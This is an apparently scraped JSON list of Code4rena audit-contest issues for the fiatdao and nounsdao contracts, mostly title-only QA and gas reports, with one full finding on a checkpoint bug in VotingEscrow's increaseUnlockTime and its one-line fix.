[{"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/219", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "ERROR IN UPDATING  **_checkpoint** IN THE **increaseUnlockTime** FUNCTION", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/217", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-fiatdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L513-L514   # Vulnerability details  ## Impact  The potentiel impact of this error are :  * Give wrong voting power to a user at a given block. * Give wrong total voting power at a given block. * Give wrong total voting power.  ## Proof of Concept  The error occured in this line : https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L513  In the **increaseUnlockTime** function the oldLocked.end passed to the function **_checkpoint** is wrong as it is the same as the new newLock end time (called unlock_time) instead of being equal to **oldUnlockTime** .  In the given CheckpointMath.md file it is stated that checkpoint details for  **increaseUnlockTime** function should be :  |  Lock | amount | end |  | ------------- |:-------------:|:-------------:| | old   | owner.delegated  | owner.end  |   | new  | owner.delegated  | T |    BUT with this error  you get a different checkpoint details :   |  Lock | amount | end |  | ------------- |:-------------:|:-------------:| | old   | owner.delegated  | T  |   | new  | owner.delegated  | T |    The error is illustrated in the code below :  ```         LockedBalance memory locked_ = locked[msg.sender];         uint256 unlock_time = _floorToWeek(_unlockTime); // Locktime is rounded down to weeks         /* @audit comment                  the unlock_time represent the newLock end time         */         // Validate inputs         require(locked_.amount > 0, \"No lock\");         require(unlock_time > locked_.end, \"Only increase lock end\");         require(unlock_time <= block.timestamp + MAXTIME, \"Exceeds maxtime\");         // Update lock         uint256 oldUnlockTime = locked_.end;         locked_.end = unlock_time;         /* @audit comment                  The locked_ end time is update from  oldUnlockTime  ==>  unlock_time         */         locked[msg.sender] = locked_;         if (locked_.delegatee == msg.sender) {             // Undelegated lock             require(oldUnlockTime > block.timestamp, \"Lock expired\");             LockedBalance memory oldLocked = _copyLock(locked_);             oldLocked.end = unlock_time;             /* @audit comment                  The oldLocked.end is set to unlock_time instead of   oldUnlockTime              */             _checkpoint(msg.sender, oldLocked, locked_);         } ```  The impact of this is when calculating the **userOldPoint.bias** in the **_checkpoint** function you get an incorrect value equal to **userNewPoint.bias** (because oldLocked.end == _newLocked.end which is wrong).  ``` 240        userOldPoint.bias = 241                    userOldPoint.slope * 242                    int128(int256(_oldLocked.end - block.timestamp)); ```  The wrong **userOldPoint.bias** value is later used to calculate and update the bias value for the new point in **PointHistory**.   ``` 359       lastPoint.bias = 360                  lastPoint.bias + 361                  userNewPoint.bias - 362                  userOldPoint.bias;  372       pointHistory[epoch] = lastPoint; ```  And added to that the wrong **oldLocked.end** is used to get oldSlopeDelta value which is used to update the **slopeChanges**.  ``` 271       oldSlopeDelta = slopeChanges[_oldLocked.end];  380       oldSlopeDelta = oldSlopeDelta + userOldPoint.slope; 381       if (_newLocked.end == _oldLocked.end) { 382                  oldSlopeDelta = oldSlopeDelta - userNewPoint.slope; // It was a new deposit, not extension 383        } 384       slopeChanges[_oldLocked.end] = oldSlopeDelta; ```   As the **PointHistory** and the **slopeChanges** values are used inside the functions **balanceOfAt()** ,  **_supplyAt()**,  **totalSupply()**,  **totalSupplyAt()** to calculate the voting power, THIS ERROR COULD GIVE WRONG VOTING POWER AT A GIVEN BLOCK OF A USER OR CAN GIVE WRONG TOTAL VOTING POWER.  ## Tools Used  Manual Audit  ## Recommended Mitigation Steps  The line 513 in the VotingEscrow.sol contract :  ```       513      oldLocked.end = unlock_time; ```  Need to be replaced with the following :  ```       513      oldLocked.end = oldUnlockTime; ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/215", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/214", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/213", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/212", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/211", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/210", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/209", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/208", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/207", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/205", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Delegators can Avoid Lock Commitments if they can Reliably get Themselves Blocked when Needed", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/204", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-fiatdao-findings", "body": "Delegators can Avoid Lock Commitments if they can Reliably get Themselves Blocked when Needed"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/203", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Blocking Through Change of Blocklist Could Trap Tokens", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/200", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-08-fiatdao-findings", "body": "Blocking Through Change of Blocklist Could Trap Tokens"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/197", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/196", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/195", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/192", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/190", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/187", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/186", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/183", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/179", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/178", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/177", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/175", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/173", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/170", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/167", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/166", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/161", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/159", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/155", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/154", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/151", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/148", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/147", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/146", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/144", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/142", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/141", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/138", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/137", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/135", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/133", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/132", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/130", "labels": ["bug", "G (Gas Optimization)", "high quality report"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/129", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/128", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/127", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/126", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/120", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/119", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/116", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/115", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/112", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/111", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/110", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/109", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/106", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/105", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/104", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/103", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/100", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/99", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/98", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/95", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/93", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/84", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/82", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/81", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/80", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/78", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/77", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Attacker contract can avoid being blocked by BlockList.sol", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/75", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-08-fiatdao-findings", "body": "Attacker contract can avoid being blocked by BlockList.sol"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/73", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/71", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/70", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/65", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/64", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/61", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/57", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/56", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/55", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/54", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/52", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/51", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/50", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/49", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/48", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/47", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/46", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/45", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/44", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/41", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/40", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/39", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/37", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/35", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/33", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/31", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/30", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/29", "labels": ["bug", "G (Gas Optimization)", "high quality report"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/28", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/25", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/24", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/23", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/19", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/16", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/15", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/14", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/11", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/10", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/9", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/8", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/5", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/2", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/1", "labels": [], "target": "2022-08-fiatdao-findings", "body": "Agreements & Disclosures"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/411", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/407", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/406", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/405", "labels": ["bug", "G (Gas Optimization)"], 